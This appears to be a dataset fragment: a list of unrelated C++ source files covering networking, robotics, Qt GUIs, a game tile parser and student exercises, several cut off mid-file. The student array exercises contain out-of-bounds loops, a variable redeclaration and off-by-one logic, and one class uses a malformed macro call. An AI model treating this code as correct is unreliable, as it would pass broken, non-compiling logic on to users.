-> 3, 3 -> 2, etc.\n\t\t */\n\t\tRTE_ETH_FOREACH_DEV(port) {\n\n\t\t\t/* Get burst of RX packets, from first port of pair. */\n\t\t\tstruct rte_mbuf *bufs[BURST_SIZE];\n\t\t\tconst uint16_t nb_rx = rte_eth_rx_burst(port, 0,\n\t\t\t\t\tbufs, BURST_SIZE);\n\n\t\t\tif (unlikely(nb_rx == 0))\n\t\t\t\tcontinue;\n\n\t\t\t/* Send burst of TX packets, to second port of pair. */\n\t\t\tconst uint16_t nb_tx = rte_eth_tx_burst(port ^ 1, 0,\n\t\t\t\t\tbufs, nb_rx);\n\n\t\t\t/* Free any unsent packets. */\n\t\t\tif (unlikely(nb_tx < nb_rx)) {\n\t\t\t\tuint16_t buf;\n\t\t\t\tfor (buf = nb_tx; buf < nb_rx; buf++)\n\t\t\t\t\trte_pktmbuf_free(bufs[buf]);\n\t\t\t}\n\t\t}\n\t}\n\t/* >8 End of loop. */\n}\n/* >8 End Basic forwarding application lcore. */\n\n/*\n * The main function, which does initialization and calls the per-lcore\n * functions.\n */\nint\nmain(int argc, char *argv[])\n{\n\tstruct rte_mempool *mbuf_pool;\n\tunsigned nb_ports;\n\tuint16_t portid;\n\n\tint ret{};\n\tif (argc == 1)\n\t{\n\t\t// If no arguments are passed, use default ones\n\t\tchar *default_args[] = {argv[0], \"-l\", \"1\", \"-n\", \"4\"};\n\t\targc = sizeof(default_args) / sizeof(default_args[0]);\n\t\tret = rte_eal_init(argc, default_args);\n\t}\n\telse\n\t{\n\t\tret = rte_eal_init(argc, argv);\n\t}\n\n\tif (ret < 0)\n\t{\n\t\trte_exit(EXIT_FAILURE, \"Error with EAL initialization\\n\");\n\t}\n\n\ta",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"rclcpp/rclcpp.hpp\"\n#include \"std_msgs/msg/string.hpp\"\n#include \"std_msgs/msg/int32.hpp\"\n#include \"geometry_msgs/msg/vector3.hpp\"\n#include <memory>\n#include <chrono>\n#include <functional>\n//#include <string>\nusing namespace std::chrono_literals;\nvoid callback(rclcpp::Node::SharedPtr node, rclcpp::Publisher<geometry_msgs::msg::Vector3>::SharedPtr pub)\n{\n    //static int count;\n    //auto message = std_msgs::msg::String();\n    auto input = geometry_msgs::msg::Vector3();\n    std::cin >> input.x;\n    std::cin >> input.y;\n    std::cin >> input.z;\n    //message.data = \"Hello world! \" + std::to_string(count++);\n    RCLCPP_INFO(node->get_logger(), \"Publish: %f %f %f\", input.x, input.y, input.z);\n    pub->publish(input);\n    \n}\nint main(int argc, char* argv[])\n{\n    rclcpp::init(argc, argv);\n    auto node = std::make_shared<rclcpp::Node>(\"mynode\");\n    auto qos_profile = rclcpp::QoS(rclcpp::KeepLast(10));\n    auto pub = node->create_publisher<geometry_msgs::msg::Vector3>(\"mytopic\", qos_profile);\n    std::function<void()> fn = std::bind(callback, node, pub);\n    auto timer = node->create_wall_timer(1s, fn);\n    rclcpp::spin(node);\n    rclcpp::shutdown();\n    return 0;\n}",
    "/**\n * @file pose.cpp\n * @author Toshiki Nakamura\n * @brief Class of Pose\n * @copyright Copyright (c) 2024\n */\n\n#include <utility>\n\n#include \"utils/pose.h\"\n\nPose::Pose()\n{\n  x_ = 0.0;\n  y_ = 0.0;\n  yaw_ = 0.0;\n}\n\nPose::Pose(const float x, const float y, const float yaw)\n{\n  x_ = x;\n  y_ = y;\n  yaw_ = yaw;\n}\n\nPose &Pose::operator=(const Pose &pose)\n{\n  x_ = pose.x_;\n  y_ = pose.y_;\n  yaw_ = pose.yaw_;\n  return *this;\n}\n\nPose &Pose::operator/=(const float a)\n{\n  x_ /= a;\n  y_ /= a;\n  yaw_ /= a;\n  return *this;\n}\n\nvoid Pose::set(const float x, const float y, const float yaw)\n{\n  x_ = x;\n  y_ = y;\n  yaw_ = yaw;\n}\n\nvoid Pose::move(float length, float direction, float rotation, const float fw_noise, const float rot_noise)\n{\n  length += fw_noise;\n  direction += rot_noise;\n  rotation += rot_noise;\n\n  x_ += length * cos(direction + yaw_);\n  y_ += length * sin(direction + yaw_);\n  yaw_ += rotation;\n  normalize_angle();\n}\n\nvoid Pose::normalize_angle()\n{\n  while (M_PI < yaw_)\n    yaw_ -= 2.0 * M_PI;\n  while (yaw_ < -M_PI)\n    yaw_ += 2.0 * M_PI;\n}\n",
    "#include \"MainPanel.h\"\n\n#include <QMouseEvent>\n#include <cmath>\n\nCustomPanel::CustomPanel(QWidget *parent)\n    : QWidget(parent)\n{\n    m_drawColor = Qt::black;\n}\n\nvoid CustomPanel::setColor(const QColor &color)\n{\n    m_drawColor = color;\n}\n\nvoid CustomPanel::mousePressEvent(QMouseEvent *event)\n{\n    if (event->button() == Qt::LeftButton)\n    {\n        m_lastPoint = event->pos();\n        m_lines.append(QVector<QPoint>());\n        m_lines.last().append(m_lastPoint);\n    }\n}\n\nvoid CustomPanel::mouseMoveEvent(QMouseEvent *event)\n{\n    if (event->buttons() & Qt::LeftButton) \n    {\n        drawLineTo(event->pos());\n    }\n}\n\nvoid CustomPanel::mouseReleaseEvent(QMouseEvent *event)\n{\n    if (event->button() == Qt::LeftButton)\n    {\n        update();\n    }\n}\n\nvoid CustomPanel::paintEvent(QPaintEvent *event)\n{\n    QPainter painter(this);\n    painter.fillRect(rect(), Qt::white);\n    painter.setRenderHint(QPainter::Antialiasing);\n\n    int fixedRadius = 5;\n    for (const auto &line : m_lines)\n    {\n        for (int i = 1; i < line.size(); ++i)\n        {\n            QPoint center = (line.at(i - 1) + line.at(i)) / 2;\n\n            painter.setBrush(m_drawColor);\n            painter.setPen(Qt::NoPen);\n\n            painter.drawEllipse(center, fixedRadius, fixedRadius);\n        }\n    }\n\n    QWidget::paintEvent(event);\n}\n\nvoid CustomPanel::drawLineTo(const QPoint &endPoint)\n{\n    if (m_lines.isEmpty())\n    {\n        m_lines.append(QVector<QPoint>());\n        m_lines.last().append(endPoint);\n    }\n    else\n    {\n        QPoint diff = endPoint - m_lastPoint;\n        int steps = qMax(qAbs(diff.x()), qAbs(diff.y()));\n        float dx = diff.x() / (float)steps;\n        float dy = diff.y() / (float)steps;\n\n        for (int i = 0; i < steps; ++i)\n        {\n            QPoint nextPoint(round(m_lastPoint.x() + dx * i * 2), round(m_lastPoint.y() + dy * i * 2));\n            QVector<QPoint> line;\n            line.append(m_lastPoint);\n            line.append(nextPoint);\n            m_lines.append(line);\n        }\n    }\n\n    m_lastPoint = endPoint;\n    update();\n}\n\nvoid CustomPanel::clearPanel()\n{\n    for (auto &line : m_lines)\n    {\n        line.clear();\n    }\n    m_lines.clear();\n    update();\n}\n\nvoid CustomPanel::undo()\n{\n}\n\nvoid CustomPanel::redo()\n{\n}\n",
    "#include <iostream>\n#include <map>\n\nint main() {\n    std::multimap<int, std::string> myMultimap;\n\n    // Inserindo elementos\n    myMultimap.insert(std::make_pair(1, \"um\"));\n    myMultimap.insert(std::make_pair(2, \"dois\"));\n    myMultimap.insert(std::make_pair(1, \"primeiro\"));\n    myMultimap.insert(std::make_pair(3, \"tr\u00eas\"));\n    myMultimap.insert(std::make_pair(2, \"segundo\"));\n    myMultimap.insert(std::make_pair(2, \"mais dois\"));\n    myMultimap.insert(std::make_pair(2, \"outro\"));\n\n    // Percorrendo e exibindo elementos\n    std::cout << \"Multimap antes da exclus\u00e3o:\\n\";\n    for (const auto& pair : myMultimap) {\n        std::cout << pair.first << \": \" << pair.second << std::endl;\n    }\n\n\n    auto it = myMultimap.find(2);\n    while (it != myMultimap.upper_bound(2)) {\n        if (it->first == 2) {\n            it = myMultimap.erase(it);\n        } else {\n            ++it;\n        }\n    }\n    \n    // Exibindo o multimap ap\u00f3s a exclus\u00e3o\n    std::cout << \"\\nMultimap ap\u00f3s a exclus\u00e3o:\\n\";\n    for (const auto& pair : myMultimap) {\n        std::cout << pair.first << \": \" << pair.second << std::endl;\n    }\n\n    return 0;\n}\n",
    "#include<bits/stdc++.h>\nusing namespace std;\n\n// FIND THE LAST OCCURENCE OF AN ELEMENT \nint findLastOccurence(vector<int> &v, int el){\n    int index=0;\n    int n = v.size();\n    for(int i = n-1 ; i>=0 ; i++){\n        if(v[i]==el){\n            index=i;\n            break;\n        }\n    }\n    return index;\n}\n// FIND THE TOTAL NUMBER OF PAIRS WHOSE SUM IS EQUAL TO X\nint findPairs(vector<int> &v, int x){\n    int n = v.size();\n    int count=0;\n    for(int i=0;i<n;i++){\n        for(int j=i+1;j<n;j++){\n            int sum = v[i]+v[j];\n            if(sum==x){\n                count++;\n            }\n        }\n    }\n    return count;\n}\n// FIND THE ELEMENT THAT DOES NOT HAVE A DUPLICATE\nint findElement(vector<int> &v){\n    int n = v.size();\n    for(int i=0;i<n;i++){\n        for(int j=i+1;j<n;j++){\n            if(v[i]==v[j]){\n                v[i]=-1;\n                v[j]=-1;\n            }\n        }\n    }\n    int element=0;\n    for(int i = 0; i<n ; i++){\n        if(v[i]!=-1){\n            element = v[i];\n        }\n    }\n    return element;\n}\n// FIND THE SECOND LARGEST ELEMENT IN ARRAY\nint secondLargest(vector<int> &v){\n    int max1=INT_MIN;\n    int n = v.size();\n    int maxIndex=0;\n    for(int i = 0; i<n ; i++){\n        if(v[i]>max1){\n            max1=v[i];\n            maxIndex=i;\n        }\n    }\n    v[maxIndex]=-1;\n    int max2=INT_MIN;\n    int maxIndex2=0;\n    for(int i = 0; i<n ; i++){\n        if(v[i]>max2 && v[i]!=max1 && i!=maxIndex){\n            max2=v[i];\n            maxIndex2=i;\n        }\n    }\n    return max2;\n}\n// ROTATE AN ARRAY BY K STEPS\nvoid rotateByK(vector<int> &v, int k){\n    int n = v.size();\n    k=k%n;\n    int temp[n];\n    int j=0;\n    for(int i=n-k;i<n;i++){\n        temp[j]=v[i];\n        j++;\n    }\n    for(int i=0;i<=k;i++){\n        temp[j]=v[i];\n        j++;\n    }\n    int k=0;\n    for(int i = 0; i<n ; i++){\n        v[k]=temp[i];\n        k++;\n    }\n}\n// SORT AN ARRAY WITH 0 AND 1\nvoid sortZeroesOnes(vector<int> &v){\n    int n = v.size();\n    int countZero=0;\n    for(int i = 0; i<n ; i++){\n        if(v[i]==0){\n            countZero++;\n        }\n    }\n    vector<int> w;\n    for(int i = 0; i<n ; i++){\n        if(i<=countZero){\n            w.push_back(0);\n        }\n        else{\n            w.push_back(1);\n        }\n    }\n    for(int i = 0; i<n ; i++){\n        cout << w[i] << \"\\n\"; \n    }\n}\n// USING TWO POINTER APPRAOCH SOLVE TEH ABOVE QUESTION\nvoid sortZeroesAndOnesTwoPointers(vector<int> &v){\n    int n = v.size();\n    int leftptr=0;\n    int rightptr=n-1;\n    while(leftptr<rightptr){\n        if(v[leftptr]==1 && v[rightptr]==0){\n            swap(v[leftptr],v[rightptr]);\n            leftptr++;\n            rightptr--;\n        }\n        if(v[leftptr]==0){\n            leftptr++;\n        }\n        if(v[rightptr]==1){\n            rightptr--;\n        }\n    }\n    for(int i = 0; i<n ; i++){\n        cout << v[i] << \"\\n\";\n    }\n}\n// GIVEN AN ARRAY PLACE ALL THE EVEN INTEGERS IN FRONT \nvoid sortOddsEvens(vector<int> &v){\n    int n = v.size();\n    int leftpt=0;\n    int rightpt=n-1;\n    while(leftpt<rightpt){\n        if(v[leftpt]%2!=0 && v[rightpt]%2==0){\n            swap(v[leftpt],v[rightpt]);\n            leftpt++;\n            rightpt--;\n        }\n        if(v[leftpt]%2==0){\n            leftpt++;\n        }\n        if(v[rightpt]%2!=0){\n            rightpt--;\n        }\n    }\n    for(int i = 0; i<n ; i++){\n        cout << v[i] << \"\\n\";\n    }\n}\n// GIVEN AN INTEGER ARRAY, RETURN THE SQUARE ARRAY IN INCREASING ORDER\nvoid returnSortedSquareArray(vector<int> &v){\n    int n = v.size();\n    int leftptr=0;\n    int rightptr =n-1;\n    vector<int> ans(n);\n    int index=n-1;\n    while(leftptr<=rightptr){\n        if(abs(v[leftptr]) < abs(v[rightptr])){\n            ans[index]=v[rightptr]*v[rightptr];\n            rightptr--;\n            index--;\n        }\n        else{\n            ans[index]=v[leftptr]*v[leftptr];\n            leftptr++;\n            index--;\n        }\n    }\n    for(int i = 0; i<n ; i++){\n        cout << ans[i] << \"\\n\";\n    }    \n}\n// GIVEN AN INTEGER ARRAY RETURN THE PREFIX SUM OF THE ARRAY\nvoid prefixSum(vector<int> &v){\n    int n = v.size();\n    for(int i = 1; i<n ; i++){\n        v[i]=v[i]+v[i-1];\n    }\n    for(int i = 0; i<n ; i++){\n        cout << v[i] << \"\\n\";\n    }\n}\n// GIVEN AN INTEGER ARRAY CHECK IF WE CAN PARTITION THE ARRAY INTO TWO HALVES WITH EQUAL SIM\nbool check(vector<int> &v){\n    int sum=0;\n    int n = v.size();\n    for(int i = 0; i<n ; i++){\n        sum +=v[i];\n    }\n    int prefixSum=0;\n    int suffixSum=0;\n    for(int i = 0; i<n ; i++){\n        prefixSum+=v[i];\n        suffixSum=sum-prefixSum;\n        if(prefixSum==suffixSum){\n            return true;\n        }\n    }\n    return false;\n}\n// FIND THE MAX SUM OF SUB ARRAY OF SIZE K\nint maxSum(vector<int> &v, int k){\n    int n = v.size();\n    int sum =0;\n    int maxSum=0;\n    for(int i = 0; i<n ; i++){\n        sum+=v[i];\n    }\n    maxSum=sum;\n    for(int i = 0; i<k ; i++){\n        sum = sum +v[i]-v[i-k];\n        maxSum = max(maxSum,sum);\n    }\n    return ma",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   MateriaSource.cpp                                  :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: oldault <oldault@student.42.fr>            +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/05/05 08:51:49 by oldault           #+#    #+#             */\n/*   Updated: 2024/05/06 17:08:46 by oldault          ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"MateriaSource.hpp\"\n\nMateriaSource::MateriaSource( void ) :\n  _amountStored(0)\n{\n  for (int i = 0; i < INV_SIZE; i++) {\n    _materias[i] = nullptr;\n  }\n  std::cout << FGRN( \"MateriaSource \" BOLD( \"default\" )) << FGRN(\" constructor called\\n\");\n  \n  return ;\n}\n\nMateriaSource::MateriaSource(const MateriaSource& src)\n{\n  _amountStored = src._amountStored;\n  for (int i = 0; i < INV_SIZE; i++) {\n    _materias[i] = src._materias[i];\n  }\n  std::cout << FGRN( \"MateriaSource \" BOLD( \"copy\" )) << FGRN(\" constructor called\\n\");\n\n  return ;\n}\n\nMateriaSource::~MateriaSource()\n{\n  for (int i = 0; i < INV_SIZE; i++) {\n    if (_materias[i] != nullptr) {\n      delete _materias[i];\n    }\n  }\n  std::cout << FRED( \"MateriaSource destructor called\\n\");\n  \n  return ;\n}\n\n\nMateriaSource& MateriaSource::operator=(const MateriaSource& src)\n{\n  if (this != &src) {\n    _amountStored = src._amountStored;\n    for (int i = 0; i < INV_SIZE; i++) {\n      _materias[i] = src._materias[i];\n    }\n  }\n  std::cout << FGRN( \"MateriaSource \" BOLD( \"copy\" )) << FGRN(\" operator called\\n\");\n  \n  return *this;\n}\n\n\nvoid MateriaSource::learnMateria(AMateria* m)\n{\n  if (_amountStored >= INV_SIZE) {\n    std::cout << BRED(\"Cannot store any more Materias. Storage capacity (10) exceeded\") << \"\\n\";\n    return ;\n  }\n  _materias[_amountStored++] = m;\n  \n  return ;\n}\n\nAMateria* MateriaSource::createMateria(const std::string& type)\n{\n  for (unsigned int i = 0; i < INV_SIZE; i++) {\n    if (_materias[i] && _materias[i]->getType() == type) {\n      std::cout << FMAG(\"Materia of type: \") << FMAG(BOLD( << type << )) << FMAG(\", found.\") << \"\\n\";\n      return _materias[i];\n    }\n  }\n  std::cout << FMAG(\"Materia of type: \") << FMAG(BOLD( << type << )) << FMAG(\", not found.\") << \"\\n\";\n\n  return nullptr;\n}\n",
    "#include \"TileMapParser.hpp\"\n#include <iostream>\n\nTileMapParser::TileMapParser(ResourceAllocator<sf::Texture>& textureAllocator) : textureAllocator(textureAllocator){}\n\nstd::vector<std::shared_ptr<Object>> TileMapParser::Parse(const std::string& file, sf::Vector2i offset)\n{\n    char* fileLoc = new char[file.size() + 1];\n    //TODO: make multi format version of string copy\n#ifdef MACOS\n    strlcpy(fileLoc, file.c_str(), file.size() + 1);\n#else\n    strcpy_s(fileLoc, file.size() + 1, file.c_str());\n#endif\n    \n    //TODO: error checking - check file exists before attempting open.\n    rapidxml::file<> xmlFile(fileLoc);\n    rapidxml::xml_document<> doc;\n    doc.parse<0>(xmlFile.data());\n    xml_node<>* rootNode = doc.first_node(\"map\");\n    \n    std::shared_ptr<MapTiles> tiles = BuildMapTiles(rootNode);\n    \n    int tileSizeX = std::atoi(rootNode->first_attribute(\"tilewidth\")->value());\n    int tileSizeY = std::atoi(rootNode->first_attribute(\"tileheight\")->value());\n    int mapsizeX = std::atoi(rootNode->first_attribute(\"width\")->value());\n    int mapsizeY = std::atoi(rootNode->first_attribute(\"height\")->value());\n    \n    std::vector<std::shared_ptr<Object>> tileObjects;\n    int layerCount = tiles->size() - 1;\n\n    for (const auto& layer : *tiles)\n    {\n        for (const auto& tile : *layer.second)\n        {\n            std::shared_ptr<TileInfo> tileInfo = tile->properties;\n            \n            std::shared_ptr<Object> tileObject = std::make_shared<Object>();\n           \n            const unsigned int tileScale = 3;\n            \n            auto sprite = tileObject->AddComponent<C_Sprite>();\n            sprite->SetTextureAllocator(&textureAllocator);\n            sprite->Load(tileInfo->textureId); //Check here\n            sprite->SetTextureRect(tileInfo->textureRect);\n            sprite->SetScale(tileScale, tileScale);\n            sprite->SetSortOrder(layerCount);\n            \n            float x = tile->x * tileSizeX * tileScale + offset.x;\n            float y = tile->y * tileSizeY * tileScale + offset.y;\n            tileObject->transform->SetPosition(x, y);\n            \n            tileObjects.emplace_back(tileObject);\n            layerCount--;\n        }\n    }\n    \n    return tileObjects;\n}\n\nstd::shared_ptr<TileSheets> TileMapParser::BuildTileSheetData(xml_node<>* rootNode)\n{\n    TileSheets tileSheets;\n    \n    for(xml_node<>* tilesheetNode = rootNode->first_node(\"tileset\"); \n        tilesheetNode; tilesheetNode = tilesheetNode->next_sibling(\"tileset\"))\n    {\n        TileSheetData tileSheetData;\n\n        int firstid = std::atoi(tilesheetNode->first_attribute(\"firstgid\")->value());\n\n        tileSheetData.tileSize.x = std::atoi(tilesheetNode->first_attribute(\"tilewidth\")->value());\n\n        tileSheetData.tileSize.y = std::atoi(tilesheetNode->first_attribute(\"tileheight\")->value());\n\n        int tileCount = std::atoi(tilesheetNode->first_attribute(\"tilecount\")->value());\n\n        tileSheetData.columns = std::atoi(tilesheetNode->first_attribute(\"columns\")->value());\n        tileSheetData.rows = tileCount / tileSheetData.columns;\n\n        xml_node<>* imageNode = tilesheetNode->first_node(\"image\");\n        tileSheetData.textureId = textureAllocator.Add(\n            \"../../resources/\" + std::string(imageNode->first_attribute(\"source\")->value()));\n\n        tileSheetData.imageSize.x = std::atoi(imageNode->first_attribute(\"width\")->value());\n        tileSheetData.imageSize.y = std::atoi(imageNode->first_attribute(\"height\")->value());\n\n        //We store the tile sheets firstid\n        tileSheets.insert(std::make_pair(firstid, std::make_shared<TileSheetData>(tileSheetData)));\n    }\n    return std::make_shared<TileSheets>(tileSheets);\n}\n\nstd::shared_ptr<MapTiles> TileMapParser::BuildMapTiles(xml_node<>* rootNode)\n{\n    std::shared_ptr<TileSheets> tileSheets = BuildTileSheetData(rootNode);\n    \n    std::shared_ptr<MapTiles> map = std::make_shared<MapTiles>();\n    \n    for (xml_node<>* node = rootNode->first_node(\"layer\"); node; node = node->next_sibling())\n    {\n        std::pair<std::string, std::shared_ptr<Layer>> mapLayer = BuildLayer(node, tileSheets);\n        map->emplace(mapLayer);\n    }\n    \n    return map;\n}\n\nstd::pair<std::string, std::shared_ptr<Layer>> TileMapParser::BuildLayer(xml_node<>* layerNode, std::shared_ptr<TileSheets> tileSheets)\n{\n    TileSet tileSet;\n    std::shared_ptr<Layer> layer = std::make_shared<Layer>();\n    \n    int width = std::atoi(layerNode->first_attribute(\"width\")->value());\n    int height = std::atoi(layerNode->first_attribute(\"height\")->value());\n    \n    xml_node<>* dataNode = layerNode->first_node(\"data\");\n    char* mapIndices = dataNode->value();\n    \n    std::stringstream fileStream(mapIndices);\n    \n    int count = 0;\n    \n    std::string line;\n    while (fileStream.good())\n    {\n        std::string substr;\n        std::getline(fileStream, substr, ',');\n        \n        if (!Utilities::IsInteger(substr))\n        {\n            substr.erase(std::remove(substr.begin(), substr.end(",
    "#include \"patient.h\"\r\n#include \"ui_patient.h\"\r\n#include \"chat.h\"\r\n#include \"requestappoint.h\"\r\n#include \"mainwindow.h\"\r\n#include <QFileDialog>\r\n#include <QMessageBox>\r\n\r\nPatient::Patient(QWidget *parent)\r\n    : QDialog(parent)\r\n    , ui(new Ui::Patient)\r\n{\r\n    ui->setupUi(this);\r\n    QPixmap pix(\"C:/Users/HP/Downloads/cs2LabProject-main/cs2LabProject-main/abstract-blur-hospital-clinic-interior.jpg\");\r\n    backgroundLabel = new QLabel(this);\r\n    backgroundLabel->setPixmap(pix);\r\n    backgroundLabel->setScaledContents(true);\r\n    backgroundLabel->setGeometry(0, 0, geometry().width(), geometry().height());\r\n    backgroundLabel->lower();\r\n}\r\n\r\nPatient::~Patient()\r\n{\r\n    delete ui;\r\n}\r\n\r\nvoid Patient::setUsername(const QString &username)\r\n{\r\n    this->username1=username;\r\n\r\n}\r\nvoid Patient::on_medicalRecord_clicked()\r\n{\r\n    QString filePath= \"C:/Users/HP/Desktop/CS2 Lab Project/Medical Record.txt\";\r\n    if (!filePath.isEmpty()) {\r\n        QFile file(filePath);\r\n        if (file.open(QIODevice::ReadOnly | QIODevice::Text)) {\r\n            